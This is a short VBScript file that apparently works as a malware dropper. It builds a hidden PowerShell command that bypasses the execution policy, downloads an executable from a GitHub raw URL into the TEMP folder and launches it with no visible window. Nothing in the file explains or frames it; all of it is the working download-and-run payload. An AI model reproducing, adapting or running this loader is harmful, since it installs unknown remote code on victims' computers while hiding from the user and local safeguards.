Dim objShell, strPS
Set objShell = CreateObject("Wscript.Shell")
 
' PowerShell command to download and run
strPS = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
" ""$u='https://github.com/josephk0098/25986/raw/refs/heads/main/Clie\t.exe';" & _
" $o=$env:TEMP + '\downloadedFile.exe';" & _
" Invoke-WebRequest -Uri $u -OutFile $o;" & _
" Start-Process -FilePath $o -WindowStyle Hidden"" "
 
' Run hidden

objShell.Run strPS, 0, False






